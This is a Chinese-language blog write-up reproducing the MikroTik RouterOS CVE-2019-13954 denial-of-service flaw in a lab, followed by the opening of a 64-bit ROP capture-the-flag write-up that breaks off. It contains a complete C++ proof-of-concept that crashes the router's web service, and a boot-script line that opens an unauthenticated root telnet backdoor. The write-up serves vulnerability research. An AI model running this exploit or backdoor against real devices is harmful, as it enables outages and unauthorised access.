<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__usercall sub_51F7@&lt;eax&gt;(istream *a1@&lt;eax&gt;, <span class="keyword">char</span> *a2@&lt;edx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  istream::<span class="built_in">getline</span>(a1, a2, <span class="number">0x100</span>u, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v2) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = &amp;v2[v4 - <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( *result == <span class="number">13</span> )</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC原理："><a href="#POC原理：" class="headerlink" title="POC原理："></a>POC原理：</h3><p>利用getline原理</p>
<p>虽然6.42.11的版本中JSProxyServlet::doUpload加入了长度的判断，并且getline是按照\n（getline是按行读取）结束符前取前0x100个字节，但是可以通过构造很多\00来影响整个字符串的长度，getline只会将\n前的0x100个字符读入缓冲区，再会消化掉\n转化为\00，总之getline()会根据参数对输入产生截断，不考虑字符数组的存储空间，先将输入转换为<code>&quot;xxxx\0&quot;</code>的格式</p>
<p>当是cin.getline(a, 5)时，输入abcdef，输出是abcd</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t018dc91efd8b71d1c3.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>当是cin.getline(a, 6)时，输入abcdef，输出是abcde</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01e406d44a30871599.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>说明getline可能把空行\n转化为字符\0了，然后把\0算入所谓的长度5中了，不信，上汇编</p>
<p>测试代码：（长度改为了6）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> a[<span class="number">5</span>];</span><br><span class="line">  	cin.<span class="built_in">getline</span>(a, <span class="number">6</span>);</span><br><span class="line">  	<span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">  	cout &lt;&lt; <span class="string">&quot;hello b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入abcdefghimn</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t018e0ef1515bbb3d28.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>查看内存发现，输入d额是abcdefghimn，数组的空间被依次赋值为a,b,c,d,e，可见getline把空行转化为了\0</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01394f1be521e157dd.jpg" alt="https://re1own.github.io/assets/img"></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01876a874be35d2f05.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>POC：</p>
<p>因此post发送大量/0就可以改变数组长度啦</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;boost/cstdint.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;boost/program_options.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;jsproxy_session.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;winbox_message.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> s_version[] = <span class="string">&quot;CVE-2019-13954 PoC 1.1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">parseCommandLine</span><span class="params">(<span class="keyword">int</span> p_argCount, <span class="keyword">const</span> <span class="keyword">char</span>* p_argArray[],</span></span></span><br><span class="line"><span class="params"><span class="function">                          std::string&amp; p_username, std::string&amp; p_password,</span></span></span><br><span class="line"><span class="params"><span class="function">                          std::string&amp; p_ip, std::string&amp; p_port)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        boost::<span class="function">program_options::options_description <span class="title">description</span><span class="params">(<span class="string">&quot;options&quot;</span>)</span></span>;</span><br><span class="line">        description.<span class="built_in">add_options</span>()</span><br><span class="line">        (<span class="string">&quot;help,h&quot;</span>, <span class="string">&quot;A list of command line options&quot;</span>)</span><br><span class="line">        (<span class="string">&quot;version,v&quot;</span>, <span class="string">&quot;Display version information&quot;</span>)</span><br><span class="line">        (<span class="string">&quot;username,u&quot;</span>, boost::program_options::value&lt;std::string&gt;(), <span class="string">&quot;The user to log in as&quot;</span>)</span><br><span class="line">        (<span class="string">&quot;password&quot;</span>, boost::program_options::value&lt;std::string&gt;(), <span class="string">&quot;The password to log in with&quot;</span>)</span><br><span class="line">        (<span class="string">&quot;port,p&quot;</span>, boost::program_options::value&lt;std::string&gt;()-&gt;<span class="built_in">default_value</span>(<span class="string">&quot;80&quot;</span>), <span class="string">&quot;The HTTP port to connect to&quot;</span>)</span><br><span class="line">        (<span class="string">&quot;ip,i&quot;</span>, boost::program_options::value&lt;std::string&gt;(), <span class="string">&quot;The IPv4 address to connect to&quot;</span>);</span><br><span class="line"></span><br><span class="line">        boost::program_options::variables_map argv_map;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            boost::program_options::<span class="built_in">store</span>(</span><br><span class="line">                boost::program_options::<span class="built_in">parse_command_line</span>(</span><br><span class="line">                    p_argCount, p_argArray, description), argv_map);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in"><span class="keyword">catch</span></span> (<span class="keyword">const</span> std::exception&amp; e)</span><br><span class="line">        &#123;</span><br><span class="line">            std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            std::cerr &lt;&lt; description &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        boost::program_options::<span class="built_in">notify</span>(argv_map);</span><br><span class="line">        <span class="keyword">if</span> (argv_map.<span class="built_in">empty</span>() || argv_map.<span class="built_in">count</span>(<span class="string">&quot;help&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            std::cerr &lt;&lt; description &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argv_map.<span class="built_in">count</span>(<span class="string">&quot;version&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Version: &quot;</span> &lt;&lt; ::s_version &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argv_map.<span class="built_in">count</span>(<span class="string">&quot;username&quot;</span>) &amp;&amp; argv_map.<span class="built_in">count</span>(<span class="string">&quot;ip&quot;</span>) &amp;</span><br><span class="line">            argv_map.<span class="built_in">count</span>(<span class="string">&quot;port&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            p_username.<span class="built_in">assign</span>(argv_map[<span class="string">&quot;username&quot;</span>].as&lt;std::string&gt;());</span><br><span class="line">            p_ip.<span class="built_in">assign</span>(argv_map[<span class="string">&quot;ip&quot;</span>].as&lt;std::string&gt;());</span><br><span class="line">            p_port.<span class="built_in">assign</span>(argv_map[<span class="string">&quot;port&quot;</span>].as&lt;std::string&gt;());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (argv_map.<span class="built_in">count</span>(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                p_password.<span class="built_in">assign</span>(argv_map[<span class="string">&quot;password&quot;</span>].as&lt;std::string&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                p_password.<span class="built_in">assign</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            std::cerr &lt;&lt; description &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> p_argc, <span class="keyword">const</span> <span class="keyword">char</span>** p_argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::string username;</span><br><span class="line">    std::string password;</span><br><span class="line">    std::string ip;</span><br><span class="line">    std::string port;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">parseCommandLine</span>(p_argc, p_argv, username, password, ip, port))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">JSProxySession <span class="title">jsSession</span><span class="params">(ip, port)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!jsSession.<span class="built_in">connect</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to the remote host&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate the session key but don&#x27;t log in</span></span><br><span class="line">    <span class="keyword">if</span> (!jsSession.<span class="built_in">negotiateEncryption</span>(username, password, <span class="literal">false</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Encryption negotiation failed.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::string filename;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      filename.<span class="built_in">push_back</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      filename.<span class="built_in">push_back</span>(<span class="string">&#x27;\x00&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jsSession.<span class="built_in">uploadFile</span>(filename, <span class="string">&quot;lol.&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;success!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>gdb调试验证构造的特殊post可以使系统程序www陷入死循环</p>
<p>在调试验证的过程中注意Linux默认开启了ASLR保护机制，为了好找地址，关掉ASLR</p>
<p><code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code></p>
<p>通过后门busybox登陆routeros，查看www的进程pid后，开启gdbserver附加www</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01d86c3e729a6b15cc.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>开启gdb，准备调试，设置架构为i386，目标主机为192.168.0.113，端口为1234</p>
<p><code>set architecture i386</code></p>
<p><code>target remote 192.168.0.113:1234</code></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c92873314b6cb2f4-4594631.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>同时本地运行POC，<code>info proc mappings</code>查看当前已经加载的模块，但是没发现有关jsproxy的模块</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c92873314b6cb2f4-4594631.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>对www模块进行断点，然后s几下便发现jsproxy.p出来了</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t0171c810c9416e991c-4594646.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>在ida中找到要断点的函数的偏移地址，从doUpload函数断点，偏移量为8D08</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t0171c810c9416e991c-4594646.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>将mappings中jsproxy的基地址加上偏移地址就ok了，对其断点</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01a4d56a1e67255a82.jpg" alt="https://re1own.github.io/assets/img"></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t0114455b7ee697b22e.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>接下里我们可以通过对sub_51F7下断点，然后c几次，再取消断点运行看是否会使系统重启</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c688be038633deb3-4594711.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>Sub_51F7的地址为0x77540000+0x51F7，c几次会一直执行</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c688be038633deb3-4594711-4594719.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>将断点删除后，c一下，等待一会</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c688be038633deb3-4594711-4594719.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>发现系统重启了，成功验证该漏洞！</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t015062faaac0b688d5-4594736.jpg" alt="https://re1own.github.io/assets/img"></p>
<h2 id="漏洞环境搭建过程"><a href="#漏洞环境搭建过程" class="headerlink" title="漏洞环境搭建过程"></a>漏洞环境搭建过程</h2><h3 id="RouterOS环境搭建"><a href="#RouterOS环境搭建" class="headerlink" title="RouterOS环境搭建"></a>RouterOS环境搭建</h3><p>因为CVE-2019-13954跟CVE-2018-1157原理类似，可以顺便也了解下，可以选择同时下载两个版本，都验证一下</p>
<p>CVE-2018-1157可在系统版本6.40.5验证</p>
<p>CVE-2019-13954可在系统版本6.42.11验证</p>
<p>MikroTik RouterOS镜像下载地址：<a href="https://mikrotik.com/download">https://mikrotik.com/download</a></p>
<p>虚拟机安装镜像，按a，选择所有，然后i安装，后续都默认y就行</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t015062faaac0b688d5-4594736.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>用户名是admin，密码为空，下图说明成功安装</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01a06be6e5f4eb8f0e.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>把虚拟机改成桥接模式</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01d134f1d6b563ec85.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>虚拟机获取ip</p>
<p><code>ip dhcp-client add interface=ether disabled=no</code></p>
<p>查看虚拟机获取的ip</p>
<p><code>ip dhcp-client print detail</code></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01690dd7d07c7b3f6a.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>测试是否能ping通，测试ok</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t012f677465873f447f-4594779.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>我们需要下载busybox（用于开root后门）、gdbserver.i686（远程调试）</p>
<p>busybox：<code>wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox</code></p>
<p><strong>busybox使静态编译的，不依赖于系统的动态链接库，从而不受ld.so.preload的劫持，能够正常操作文件。系统在执行程序的时候，会通过环境变量LD_PRELOAD和配置文件/etc/ld.so.preload进行预加载从而调用动态链接库，如果这两者被修改的话，那么系统程序在执行的时候，就会调用这两者被修改的内容。</strong></p>
<p>除了busybox，我们还可以通过<a href="https://github.com/tenable/routeros%E4%B8%8B%E7%9A%84**cleaner_wrasse**%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AF%E5%90%8E%E9%97%A8">https://github.com/tenable/routeros下的**cleaner_wrasse**利用漏洞开启后门</a></p>
<p>gdbserver.i686下载地址：<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.i686">https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.i686</a></p>
<p>下载后，我们还需要一个LiveDVD的linux系统镜像，用来挂载RouterOS的文件系统，并上传和改写文件</p>
<p>CentOS-6.10-x86-64-LiveDVD下载地址：<a href="https://vault.centos.org/6.10/isos/x86_64/">https://vault.centos.org/6.10/isos/x86_64/</a></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t012d05f0167b7dde43.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>在虚拟机设置CD/DVD驱动器为上面下载的CentOS的镜像</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t0140d954d3217659a7-20230520110319027.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>在启动磁盘这选择CD/DVD，并重新启动</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c22dfbef6e1d618d-20230520110317028.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>如果启动非常慢，可以在虚拟机设置里，把CPU的核心和内存分配多点，这样运行快些</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01e30b5723ff26aa78.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>如果可以看到有rw这个文件夹，说明挂载成功了</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t012da868a801699a77.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>进入rw文件夹，打开终端，进入root权限，如果disk是绿色的说明没有损坏，我有一次是红色的，如果也出现跟我类似的情况就重装一次RouterOS就行</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c6423bfa37f16b70.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>进入disk文件夹，因为我已经下过了，并且把busybox-i686和gdbserver.i686都放到自己的服务器上了，所以我这里就直接用scp从服务器上下载下来</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01367c14e18d10c7c9.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>别忘了给权限</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01f2553780f09fba37.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>最后我们还需要在/rw目录下编写一个DEFCONF脚本，用来使RouterOS开机运行后门，RouterOS每次开机都会运行DEFCONF这个文件，但是重启之后会没了，不想麻烦的，可以开个快照</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok; /rw/disk/busybox-i686 telnetd -l /bin/bash -p 1270;</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t0183f84ab6f62fd833-20230520110259677.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>在虚拟机里从硬盘重启RouterOS，重启后在要输入账号的时候出现下面这样，说明busybox的后门成功开启了</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01f1546d1aeae56c18.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>此时，我们可以不通过用户名和密码就在ubuntu中直接telnet远程登陆RouterOS了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet ip port</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01bebb5e5a94333012.jpg" alt="https://re1own.github.io/assets/img"></p>
<h3 id="漏洞文件获取"><a href="#漏洞文件获取" class="headerlink" title="漏洞文件获取"></a>漏洞文件获取</h3><p>在通过后门登陆后，查看www和jsproxy.p所在的位置</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01c94008b4b9eb02c4.jpg" alt="https://re1own.github.io/assets/img"></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t013315db1cdc5e6e1c.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>这里可以通过工具<a href="https://github.com/BigNerd95/Chimay-Red">Chimay-Red</a>从官网上提取6.40.5和6.42.11版本的www、jsproxy.p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./tools/getROSbin.py 6.40.5 x86 /nova/bin/www www_binary</span><br><span class="line">./tools/getROSbin.py 6.42.11 x86 /nova/bin/www www_binary_2</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t011f7a1f68c35be6c4.jpg" alt="https://re1own.github.io/assets/img"></p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01dce32a2a7bc96768.jpg" alt="https://re1own.github.io/assets/img"></p>
<h3 id="编译生成POC"><a href="#编译生成POC" class="headerlink" title="编译生成POC"></a>编译生成POC</h3><p>依赖环境:</p>
<ul>
<li>Boost 1.66 or higher</li>
<li>cmake （我ubuntu有装过，就不再装了）</li>
</ul>
<p>安装Boost：</p>
<p>Ubuntu：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libboost-dev</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;boost/version.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;boost/config.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; BOOST_VERSION &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; BOOST_LIB_VERSION &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; BOOST_PLATFORM &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; BOOST_COMPILER &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; BOOST_STDLIB &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能运行并且出现下面的信息，说明成功</p>
<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t011279d2d5170c800b.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>POC编译的环境以及其他要用到的脚本文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/tenable/routeros.git</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01b1e77b77f2ec970c.jpg" alt="https://re1own.github.io/assets/img"></p>
<p>编译生成cve_2019_13954的poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd cve_2019_13954</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p><img src="https://re1own.github.io/assets/img/MikroTik-CVE-2019-13954%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/t01942fb153f2995cdc.jpg" alt="https://re1own.github.io/assets/img"></p>
]]></content>
      <categories>
        <category>IoT安全</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-64位ROP-Bugku_PWN4</title>
    <url>/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/</url>
    <content><![CDATA[<p>没有开任何保护<br><img width="357" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdacnb6ej30ju0ayq4d.jpg"></p>
<p>反汇编很明显栈溢出<br><img width="947" alt="image" src="https://user-images.githubusercontent.com/51265145/111448765-b42ad380-8749-11eb-8852-c7ff57859d13.png"><br><img width="486" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdadd43cj30r00pqdix.jpg"></p>
<p>然而只有System函数地址是已知的(0x400570)，参数”/bin/sh”未知<br>发现有$0(代表bash,做参数等同于”/bin/sh”)<br><img width="1435" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdaelmxfj31ot0u0n69.jpg"></p>
